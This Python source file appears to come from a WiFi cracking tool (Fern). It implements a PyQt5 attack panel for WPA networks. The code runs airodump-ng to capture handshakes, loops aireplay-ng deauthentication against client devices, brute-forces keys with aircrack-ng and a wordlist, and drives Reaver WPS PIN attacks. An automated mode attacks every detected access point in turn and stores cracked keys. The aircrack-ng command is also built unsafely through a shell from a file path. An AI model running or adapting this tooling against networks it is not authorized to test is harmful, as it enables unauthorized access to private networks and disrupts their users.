import re
import time
import subprocess
import threading
from xml.etree import ElementTree
from core.fern import *
from gui.attack_panel import *
from core.functions import *
from core.settings import *
from core.variables import *

from core import variables

from PyQt5 import QtCore, QtGui, QtWidgets
#
# Wpa Attack window class for decrypting wep keys
#

class wpa_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
    update_client_signal = QtCore.pyqtSignal()
    new_access_point_detected_signal = QtCore.pyqtSignal()
    update_database_label_signal = QtCore.pyqtSignal()
    client_is_there_signal = QtCore.pyqtSignal()
    client_not_in_list_signal = QtCore.pyqtSignal()
    update_word_signal = QtCore.pyqtSignal('QString')
    update_progressbar_signal = QtCore.pyqtSignal()
    update_speed_signal = QtCore.pyqtSignal('QString')
    wpa_key_found_signal = QtCore.pyqtSignal()
    deauthenticating_signal = QtCore.pyqtSignal()
    handshake_captured_signal = QtCore.pyqtSignal()
    Stop_progress_display_signal = QtCore.pyqtSignal()
    bruteforcing_signal = QtCore.pyqtSignal()
    set_maximum_signal = QtCore.pyqtSignal()
    wpa_key_not_found_signal = QtCore.pyqtSignal()
    change_tree_item_signal = QtCore.pyqtSignal()
    start_automated_attack_signal = QtCore.pyqtSignal()
    stop_scan_signal = QtCore.pyqtSignal()
    wordlist_lines_counted_signal = QtCore.pyqtSignal('QString')

    def __init__(self):
        QtWidgets.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.access_point = str()
        self.client_list = []
        self.started = False                # If False it means attack is not active or has been stopped, can be used to control process

        self.wordlist = str()

        self.settings = Fern_settings()     # For saving settings

        self.wps_update_timer = QtCore.QTimer(self)
        self.wps_update_timer.timeout.connect(self.set_if_WPS_Support)
        self.wps_update_timer.start(1000)

        self.attack_button.clicked.connect(self.launch_attack)
        self.dictionary_set.clicked.connect(self.dictionary_setting)
        self.update_client_signal.connect(self.update_client_list)
        self.client_not_in_list_signal.connect(self.display_client)
        self.client_is_there_signal.connect(self.client_available)
        self.wps_attack_radio.clicked.connect(self.check_reaver_status)
        self.deauthenticating_signal.connect(self.deauthenticating_display)
        self.handshake_captured_signal.connect(self.handshake_captured)
        self.bruteforcing_signal.connect(self.bruteforce_display)
        self.wpa_key_found_signal.connect(self.wpa_key_found)
        self.update_word_signal['QString'].connect(self.update_word_label)
        self.update_progressbar_signal.connect(self.update_progress_bar)
        self.update_speed_signal['QString'].connect(self.update_speed_label)
        self.wpa_key_not_found_signal.connect(self.key_not_found)
        self.set_maximum_signal.connect(self.set_maximum)
        self.Stop_progress_display_signal.connect(self.display_label)
        self.wordlist_lines_counted_signal['QString'].connect(self.set_progress_bar)

        if len(self.client_list) == 0:
            threading.Thread(target=self.auto_add_clients).start()

        victim_access_point = sorted(wpa_details.keys())[0]
        variables.victim_mac = wpa_details[victim_access_point][0]
        variables.victim_channel = wpa_details[victim_access_point][1]
        variables.victim_access_point = victim_access_point

        victim_power = wpa_details[victim_access_point][3]
        victim_speed = wpa_details[victim_access_point][2]

        cracked_key = get_key_from_database(variables.victim_mac,"WPA")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(cracked_key))
        else:
            self.key_label.setVisible(False)

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(variables.victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(variables.victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.set_if_WPS_Support()




        ############## ATACK PANEL METHODS #####################
        self.access_points = set()
        self.client_list = []

        self.index = 0
        self.isfinished = False
        self.control = True
        self.cracked_keys = 0
        self.thread_control = True

        self.select_client = str()
        self.progress_bar_max = int()
        self.wpa_key_commit = str()
        self.current_word= str()
        self.word_number = int()
        self.current_speed = str()

        self.access_points = set()
        self.mac_address = str()
        self.wifi_icon = QtGui.QPixmap("%s/resources/radio-wireless-signal-icone-5919-96.png"%os.getcwd())

        self.new_access_point_detected_signal.connect(self.display_new_access_point)
        self.ap_listwidget.itemSelectionChanged.connect(self.display_selected_target)

        self.start_automated_attack_signal.connect(self.wpa_launch_attack)
        self.change_tree_item_signal.connect(self.change_treeItem)

        self.wpa_disable_items()
        self.ap_listwidget.clear()
        threading.Thread(target=self.Check_New_Access_Point).start()

        self.keys_cracked_label.setVisible(False)
        self.display_current_wordlist()                                                             # Display previous wordlist
        self.setStyleSheet('background-image: url("%s/resources/binary_2.png");color:rgb(172,172,172);'%(os.getcwd()))
        self.attack_type_combo.setStyleSheet('color: rgb(172,172,172);background-color: black;font: %spt;'%(font_size()))
        self.set_Key_Clipbord()

     ############## CLIPBOARD AND CONTEXT METHODS #####################

    def set_Key_Clipbord(self):
        self.clipboard_key = str()
        self.clipbord = QtWidgets.QApplication.clipboard()
        self.key_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.wps_pin_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)

        self.key_label.customContextMenuRequested[QtCore.QPoint].connect(self.show_key_menu)
        self.wps_pin_label.customContextMenuRequested[QtCore.QPoint].connect(self.show_wps_key_menu)


    def Copy_Key(self,key_type):
        key_string = str()

        if(key_type == "WPS PIN"):
            key_string = self.wps_pin_label.text()
            actual_key = re.findall("WPS PIN: ([\S \w]+)</font>",key_string)
            if(actual_key):
                self.clipboard_key = actual_key[0]
        else:
            key_string = self.key_label.text()
            actual_key = re.findall("WPA KEY: ([\S \w]+)</font>",key_string)
            if(actual_key):
                self.clipboard_key = actual_key[0]
        self.clipbord.setText(self.clipboard_key)


    def show_key_menu(self,pos):
        menu = QtWidgets.QMenu()

        copy_action = object()
        convert_ascii_action = object()
        convert_hex_action = object()

        copy_action = menu.addAction("Copy Key")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))

        if(selected_action == copy_action):
            self.Copy_Key("OTHER KEY")



    def show_wps_key_menu(self,pos):
        menu = QtWidgets.QMenu()
        copy_action = menu.addAction("Copy WPS Pin")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))
        if(selected_action == copy_action):
            self.Copy_Key("WPS PIN")


    ############## END OF CLIPBOARD AND CONTEXT METHODS #################


    def set_Progressbar_color(self,color):
        COLOR_STYLE = '''
        QProgressBar {
             border: 2px solid %s;
             border-radius: 10px;
         }

         QProgressBar::chunk {
             background-color: %s;
         }
        '''
        self.progressBar.setStyleSheet(COLOR_STYLE % (color,color))


    def display_selected_target(self):
        self.client_list = []
        self.attack_type_combo.clear()

        selected_item = self.ap_listwidget.currentItem()
        victim_access_point = str(selected_item.text())

        # wpa_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        variables.victim_mac = wpa_details[victim_access_point][0]
        variables.victim_channel = wpa_details[victim_access_point][1]
        variables.victim_access_point = victim_access_point

        victim_power = wpa_details[victim_access_point][3]
        victim_speed = wpa_details[victim_access_point][2]

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(variables.victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(variables.victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.set_if_WPS_Support()

        cracked_key = get_key_from_database(variables.victim_mac,"WPA")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(cracked_key))
            self.tip_display()
        else:
            self.key_label.setVisible(False)

        self.client_update()
        self.update_client_signal.emit()
        if len(self.client_list) == 0:
            threading.Thread(target=self.auto_add_clients).start()


    def show_tips(self):
        tips = tips_window()
        tips.type = 2
        tips.setWindowTitle("Tips")
        tips.label_2.setText("To copy the successfully cracked keys to clipboard, Please right click")
        tips.label_3.setText("on the key of your choice and select \"Copy\".")
        tips.label_4.setText("You can also convert between ASCII to HEX keys for WEP.")
        tips.label_5.setVisible(False)
        tips.exec_()



    def tip_display(self):
        if(self.settings.setting_exists("copy key tips")):
            if(self.settings.read_last_settings("copy key tips") == "0"):
                self.show_tips()
        else:
            self.settings.create_settings("copy key tips","1")
            self.show_tips()


    def display_access_points(self):
        self.ap_listwidget.clear()
        self.ap_listwidget.setSpacing(12)
        for access_point in wpa_details.keys():
            self.access_points.add(access_point)
            item =  QtWidgets.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtWidgets.QListView.Snap)


    def Check_New_Access_Point(self):
        while(True):
            updated_list = set(wpa_details.keys())
            if(True):
                new_list = self.access_points.symmetric_difference(updated_list)
                if(len(list(new_list))):
                    self.new_access_point_detected_signal.emit()
            time.sleep(4)


    def display_new_access_point(self):
        self.ap_listwidget.setSpacing(12)
        new_access_points = self.access_points.symmetric_difference(set(wpa_details.keys()))
        for access_point in list(new_access_points):
            self.access_points.add(access_point)
            item =  QtWidgets.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtWidgets.QListView.Snap)

    #
    # SIGNALS AND SLOTS
    #

    def wpa_disable_items(self):
        self.cracking_label_2.setEnabled(False)
        self.injecting_label.setEnabled(False)
        self.associate_label.setEnabled(False)
        self.injection_work_label_2.setEnabled(False)
        self.gathering_label.setEnabled(False)
        self.progressBar.setValue(0)
        self.set_Progressbar_color("#8B0000")       # RED
        self.ivs_progress_label.setEnabled(False)
        self.dictionary_set.setVisible(False)
        self.injecting_label.setText("Deauthentication Status")
        self.associate_label.setText("Probing Access Point")
        self.injection_work_label_2.setText("Current Dictionary File")
        self.ivs_progress_label.setText('Current Phrase')
        self.cracking_label_2.setText("Bruteforcing Encryption")
        self.gathering_label.setText("Handshake Status")
        self.finished_label.setText("Finished")
        self.finished_label.setEnabled(False)
        self.dictionary_set.setVisible(True)
        self.key_label.setVisible(False)
        self.attack_type_combo.setEditable(True)

        if self.automate_checkbox.isChecked() == False:
            self.keys_cracked_label.setVisible(False)

        self.wps_pin_label.setVisible(False)
        self.attack_button.setText("Attack")


    def set_if_WPS_Support(self,messagebox = False):
        victim_mac = variables.victim_mac
        if not variables.wps_functions.is_WPS_Device(victim_mac):
            self.wps_support_label.setEnabled(False)
            self.wps_support_label.setText("Supports WPS")
            if(messagebox):
                QtWidgets.QMessageBox.warning(self,"WPS Device Support","WPS (WIFI Protected Setup) is not supported or is disabled by the selected access point")
            self.regular_attack_radio.setChecked(True)
            return

        self.wps_support_label.setEnabled(True)
        self.wps_support_label.setText("<font color=yellow>Supports WPS</font>")


    def check_reaver_status(self):
        if not variables.wps_functions.reaver_Installed():
            answer = QtWidgets.QMessageBox.question(self,"Reaver not Detected",
            '''The Reaver tool is currently not installed,The tool is necessary for attacking WPS Access Points.\n\nDo you want to open the download link?''',
            QtWidgets.QMessageBox.Yes,QtWidgets.QMessageBox.No)
            if(answer == QtWidgets.QMessageBox.Yes):
                variables.wps_functions.browse_Reaver_Link()

            self.regular_attack_radio.setChecked(True)
            return

        self.set_if_WPS_Support(True)


    ############################################################################


    def cancel_wpa_attack(self):
        subprocess.getstatusoutput('killall airodump-ng')
        subprocess.getstatusoutput('killall aircrack-ng')
        subprocess.getstatusoutput('killall aireplay-ng')
        self.attack_button.clicked.disconnect(self.cancel_wpa_attack)
        self.attack_button.clicked.connect(self.launch_attack)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Attack')
        self.thread_control = True
        self.started = False

        if(self.wps_attack_radio.isChecked()):
            variables.wps_functions.stop_Attack_WPS_Device()




    def update_client_list(self):
        client_mac_addresses = []
        for mac_address in self.client_list:
            if str(mac_address) not in client_mac_addresses:
                client_mac_addresses.append(str(mac_address))
        self.attack_type_combo.clear()
        self.attack_type_combo.addItems(client_mac_addresses)

        if bool(client_mac_addresses):
            if(self.automate_checkbox.isChecked()):
                if self.thread_control == True:
                    self.wpa_launch_attack()


    def display_client(self):
        self.ivs_progress_label.setEnabled(True)
        self.ivs_progress_label.setText("<font color=red>Automatically probing and adding clients mac-addresses, please wait...</font>")

    def client_available(self):
        self.ivs_progress_label.setEnabled(False)
        self.ivs_progress_label.setText("Current Phrase")

    def deauthenticating_display(self):
        self.injecting_label.setEnabled(True)
        self.injecting_label.setText('<font color=yellow>Deauthenticating %s</font>'%(self.select_client))

    def handshake_captured(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Handshake Captured</font>')

        if self.settings.setting_exists('capture_directory'):
            shutil.copyfile('/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap',\
                self.settings.read_last_settings('capture_directory') + '/%s_Capture_File(WPA).cap'%(variables.victim_access_point))


    def bruteforce_display(self):
        self.cracking_label_2.setEnabled(True)
        self.cracking_label_2.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')

    def wpa_key_found(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Attack')

        self.new_automate_key()

        wpa_key_read = reader('/tmp/fern-log/WPA-DUMP/wpa_key.txt')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.key_label.setEnabled(True)
        self.cancel_wpa_attack()
        self.key_label.setVisible(True)
        self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(wpa_key_read))
        self.set_Progressbar_color("green")

        if self.wpa_key_commit == 0:
            set_key_entries(variables.victim_access_point,variables.victim_mac,'WPA',wpa_key_read,variables.victim_channel)            #Add WPA Key to Database Here
            self.update_database_label_signal.emit()
            self.wpa_key_commit += 1
            self.isfinished = True

        self.tip_display()      # Display tips



    def update_word_label(self,current_word):
        self.ivs_progress_label.setEnabled(True)
        self.ivs_progress_label.setText('<font color=yellow>%s</font>'%(current_word))

    def update_progress_bar(self):
        self.progressBar.setValue(self.word_number)


    def update_speed_label(self,current_speed):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Speed: \t %s k/s</font>'%(current_speed))

    def display_label(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')

    def key_not_found(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        if 'wpa_key.txt' in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            pass
        else:
            self.ivs_progress_label.setEnabled(True)
            self.ivs_progress_label.setText('<font color=red>WPA Key was not found, please try another wordlist file</font>')

            if bool(self.client_list):
                if(self.automate_checkbox.isChecked()):
                    if self.thread_control == True:
                        self.wpa_launch_attack()

    def set_maximum(self):
        self.progressBar.setValue(self.progress_bar_max)



    #
    # Threads For Automation
    #
    def auto_add_clients(self):
        loop_control = True
        temp_mac_address = str(variables.victim_mac.strip(' '))
        while temp_mac_address not in self.client_list:
            if(self.wps_attack_radio.isChecked()):
                if(variables.wps_functions.is_WPS_Device(variables.victim_mac)):
                    self.client_is_there_signal.emit()
                    self.update_client_signal.emit()
                    return
            if len(self.client_list) >= 1:
                self.client_is_there_signal.emit()
                self.update_client_signal.emit()
                break
            else:
                time.sleep(6)
                if not self.started:
                    self.client_not_in_list_signal.emit()
                if(loop_control):
                    threading.Thread(target=self.probe_for_Client_Mac).start()
                    loop_control = False
                self.client_update()
                self.update_client_signal.emit()


    def probe_for_Client_Mac(self):
        variables.exec_command("airodump-ng -a --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
                                                --output-format netxml  --encrypt wpa %s"%(variables.victim_channel,variables.monitor_interface))


    def client_update(self):
        try:
            wpa_tree = ElementTree.parse('/tmp/fern-log/WPA/zfern-wpa-01.kismet.netxml').getroot()

            for access_point_info in wpa_tree:
                bssid = access_point_info.find("BSSID").text
                for client in access_point_info.iter("wireless-client"):
                    client_mac = client.find("client-mac").text

                    if bssid == variables.victim_mac:
                        self.client_list.append(client_mac)
        except Exception:
            pass



    def launch_brutefore(self):
        current_word_regex = re.compile("Current passphrase: ([\w\s!@#$%^&*()-=_+]+)",re.IGNORECASE)
        keys_speed_regex = re.compile("(\d+.?\d+) k/s",re.IGNORECASE)
        keys_tested_regex = re.compile("(\d+) keys tested",re.IGNORECASE)

        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \naircrack-ng -a 2 -w '%s' wpa_dump-01.cap -l wpa_key.txt" % (self.wordlist),
                             shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

        stdout = crack_process.stdout

        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            stdout_read = stdout.readline().decode("ascii",errors="ignore")
            self.current_word = str()

            current_word = current_word_regex.findall(stdout_read)
            if(current_word):
                self.current_word = current_word[0]
                self.update_word_signal.emit(self.current_word)

            word_number = keys_tested_regex.findall(stdout_read)
            if(word_number):
                self.word_number = int(word_number[0])
                self.update_progressbar_signal.emit()

            current_speed = keys_speed_regex.findall(stdout_read)
            if(current_speed):
                self.current_speed = current_speed[0]
                self.update_speed_signal.emit(self.current_speed)

        self.wpa_key_found_signal.emit()



    def wpa_capture(self):
        monitor_interface = variables.monitor_interface
        variables.exec_command('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(variables.xterm_setting,variables.victim_mac,variables.victim_channel,monitor_interface))

    def deauthenticate_client(self):
        monitor_interface = variables.monitor_interface
        variables.exec_command('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,self.select_client,monitor_interface))

    def capture_check(self):
        variables.exec_command('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')

    def capture_loop(self):
        time.sleep(3)
        self.deauthenticating_signal.emit()
        while '1 handshake' not in reader('/tmp/fern-log/WPA-DUMP/capture_status.log'):
            if(self.started == False):                                  # Break deauthentication loop if attack has been stopped
                return
            threading.Thread(target=self.deauthenticate_client).start()
            time.sleep(10)
            threading.Thread(target=self.capture_check).start()
        self.handshake_captured_signal.emit()
        subprocess.getstatusoutput('killall airodump-ng')
        subprocess.getstatusoutput('killall aireplay-ng')
        time.sleep(1)
        self.bruteforcing_signal.emit()

        threading.Thread(target=self.launch_brutefore).start()
        threading.Thread(target=self.wordlist_check).start()



    def wordlist_check(self):
        control_word = 0
        while control_word != 1:
            controller = self.current_word
            time.sleep(30)
            if controller == self.current_word:
                control_word = 1
                self.set_maximum_signal.emit()
                self.wpa_key_not_found_signal.emit()


    def display_current_wordlist(self):
        if(self.settings.setting_exists("wordlist")):
            get_temp_name = self.settings.read_last_settings("wordlist")   #Just for displaying name of wordlist to label area
            self.wordlist = get_temp_name
            split_name = get_temp_name.split(os.sep)
            if(split_name):
                filename = split_name[-1]
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))
            else:
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')



    def launch_attack(self):
        if(self.automate_checkbox.isChecked()):
            threading.Thread(target=self.launch_attack_2).start()
        else:
            self.wpa_launch_attack()


    def launch_attack_2(self):
        self.isfinished = True

        for index,access_point in enumerate(wpa_details.keys()):
            variables.victim_access_point = access_point
            variables.victim_mac = wpa_details[access_point][0]
            variables.victim_channel = wpa_details[access_point][1]

            while(self.isfinished == False):
                time.sleep(4)
            if self.control == False:
                break
            if(self.index == (len(wpa_details.keys()) - 1)):
                self.control = False
            if(index >= 1):
                self.change_tree_item_signal.emit()
            self.start_automated_attack_signal.emit()
            self.index = index
            self.isfinished = False

        while(self.thread_control == False):
            time.sleep(1)



    def change_treeItem(self):
        if(self.automate_checkbox.isChecked()):
            self.ap_listwidget.setCurrentItem(self.ap_listwidget.item(self.index))
            self.display_selected_target()


    def new_automate_key(self):
        self.cracked_keys += 1
        if(self.automate_checkbox.isChecked()):
            self.keys_cracked_label.setVisible(True)
            self.keys_cracked_label.setText("<font color=yellow><b>%s keys cracked</b></font>"%(str(self.cracked_keys)))
        else:
            self.keys_cracked_label.setVisible(False)



    def wpa_launch_attack(self):
        self.wpa_key_commit = 0

        self.wpa_disable_items()

        if(is_already_Cracked(variables.victim_mac,"WPA")):
            answer = QtWidgets.QMessageBox.question(self,"Access Point Already Cracked",variables.victim_access_point + "'s key already exists in the database, Do you want to attack and update the already saved key?",QtWidgets.QMessageBox.Yes,QtWidgets.QMessageBox.No);
            if(answer == QtWidgets.QMessageBox.No):
                self.control = True
                return

        if(self.wps_attack_radio.isChecked()):                                      # WPS Attack Mode
            self.control = True
            self.wpa_disable_items()
            variables.wps_functions.victim_MAC_Addr = variables.victim_mac
            self.set_WPS_Objects(variables.wps_functions)
            variables.wps_functions.start()
            self.isfinished = False
            self.progressBar.setValue(0)
            self.attack_button.clicked.disconnect(self.launch_attack)
            self.attack_button.clicked.connect(self.cancel_wpa_attack)
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
            self.attack_button.setIcon(icon)
            self.attack_button.setText('Stop')
            self.started = True
            self.thread_control = False
            return

        self.select_client = self.attack_type_combo.currentText()

        if(self.select_client == str()):
            QtWidgets.QMessageBox.warning(self,"WPA Attack Requirement","At least one client MAC-Address asscociated with the Access Point is required to successfully attack the WPA Encryption, If you know a client MAC Address you can add it manually or wait for the probing process to detect client addresses")
            self.attack_type_combo.setFocus()
            return

        if not Check_MAC(self.select_client):
            QtWidgets.QMessageBox.warning(self,'Invalid Client MAC Address',variables.invalid_mac_address_error.strip('/n'))
            return

        self.stop_scan_signal.emit()
        subprocess.getstatusoutput('killall airodump-ng')
        subprocess.getstatusoutput('killall airmon-ng')
        subprocess.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')

        if self.select_client == str():
            self.associate_label.setEnabled(True)
            self.associate_label.setText('<font color=red>Client mac-address is needed</font>')
        else:
            if not self.settings.setting_exists("wordlist"):
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')
            else:
                get_temp_name = self.settings.read_last_settings("wordlist")   #Just for displaying name of wordlist to label area
                split_name = get_temp_name.split(os.sep)
                if(split_name):
                    filename = split_name[-1]
                    self.injection_work_label_2.setEnabled(True)
                    self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))
                else:
                    self.injection_work_label_2.setEnabled(True)
                    self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')

                self.progressBar.setMaximum(10000)                                                  # Temporarily set the progressBar to 10000, until actual wordlist count is determined

                if(self.settings.setting_exists(get_temp_name)):                                    # if the line count exists for previously used wordlist
                    self.progress_bar_max = int(self.settings.read_last_settings(get_temp_name))    # set the progress_bar variable to the cached count
                    self.progressBar.setMaximum(self.progress_bar_max)
                else:
                    threading.Thread(target=self.find_dictionary_length,args=(get_temp_name,)).start()           # open thread to count the number of lines in the new wordlist


                subprocess.getstatusoutput('killall airodump-ng')
                subprocess.getstatusoutput('killall aireplay-ng')
                self.associate_label.setEnabled(True)
                self.associate_label.setText("<font color=yellow>Probing Access Point</font>")
                subprocess.getstatusoutput('touch /tmp/fern-log/WPA-DUMP/capture_status.log')
                self.progressBar.setValue(0)
                self.attack_button.clicked.disconnect(self.launch_attack)
                self.attack_button.clicked.connect(self.cancel_wpa_attack)
                icon = QtGui.QIcon()
                icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
                self.attack_button.setIcon(icon)
                self.attack_button.setText('Stop')
                self.started = True
                self.thread_control = False

                threading.Thread(target=self.wpa_capture).start()

                threading.Thread(target=self.capture_loop).start()


    def find_dictionary_length(self,filename):
        self.progress_bar_max = line_count(filename)
        self.wordlist_lines_counted_signal.emit(filename)

    def set_progress_bar(self,filename):
        int_max = 2147483630									# Avoid a C based interger overflow
        if self.progress_bar_max > int_max:
            self.progress_bar_max = int_max
        self.progressBar.setMaximum(self.progress_bar_max)
        self.settings.create_settings(filename, str(self.progress_bar_max))



    def dictionary_setting(self):
        filename = QtWidgets.QFileDialog.getOpenFileName(self,"Select Wordlist","")[0]
        if(filename):

            self.settings.create_settings("wordlist",filename)

            get_temp_name = self.settings.read_last_settings("wordlist")
            self.wordlist = get_temp_name
            split_name = get_temp_name.replace('/','\n')
            filename_split = split_name.splitlines()
            try:
                filename = filename_split[-1]
            except IndexError:
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')
            self.injection_work_label_2.setEnabled(True)
            self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))


    # WPS AND REGULAR ATTACK STARTUP

    def set_WPS_Objects(self,instance):
        self.progressBar.setMaximum(100)
        self.progressBar.setValue(0)
        instance.Associating_with_WPS_device_signal.connect(self.associating_wps)
        instance.Bruteforcing_WPS_Device_signal.connect(self.associated_bruteforing)
        instance.WPS_Progress_signal.connect(self.updating_progress)
        instance.Cracked_WPS_Pin_signal.connect(self.display_WPS_pin)
        instance.Cracked_WPS_Key_signal.connect(self.display_Cracked_Key)


    def associating_wps(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText("<font color=yellow>Associating with WPS Device</font>")


    def associated_bruteforing(self):
        self.injecting_label.setEnabled(True)
        self.gathering_label.setEnabled(True)
        self.injecting_label.setText("<font color=yellow>Associated with %s</font>" % variables.victim_mac)
        self.gathering_label.setText("<font color=yellow>Bruteforcing WPS Device</font>")


    def updating_progress(self):
        self.ivs_progress_label.setEnabled(True)
        self.cracking_label_2.setEnabled(True)

        value = int(float(variables.wps_functions.progress))
        self.progressBar.setValue(value)
        if(value < 33):
            self.set_Progressbar_color("#8B0000")   # RED
        elif(value < 66):
            self.set_Progressbar_color("#CCCC00")   # YELLOW
        else:
            self.set_Progressbar_color("green")

        self.ivs_progress_label.setText("<font color=yellow>" + variables.wps_functions.progress + "% Complete</font>")
        self.cracking_label_2.setText("<font color=yellow>Updating Progress</font>")


    def display_WPS_pin(self):
        self.wps_pin_label.setEnabled(True)
        self.wps_pin_label.setVisible(True)
        self.wps_pin_label.setText("<font color=red>WPS PIN: " + variables.wps_functions.get_keys()[0] + "</font>" )


    def display_Cracked_Key(self):
        self.key_label.setEnabled(True)
        self.key_label.setVisible(True)
        self.key_label.setText("<font color=red>WPA KEY: " + variables.wps_functions.get_keys()[1] + "</font>" )
        self.set_Progressbar_color("green")
        set_key_entries(variables.victim_access_point,variables.victim_mac,'WPA',variables.wps_functions.get_keys()[1],variables.victim_channel)
        self.update_database_label_signal.emit()
        self.finished_label.setText("<font color=yellow>Finished</font>")
        self.new_automate_key()
        self.cancel_wpa_attack()
        self.isfinished = True
        self.tip_display()          # Display Tips


    def closeEvent(self,event):
        self.wps_update_timer.stop()
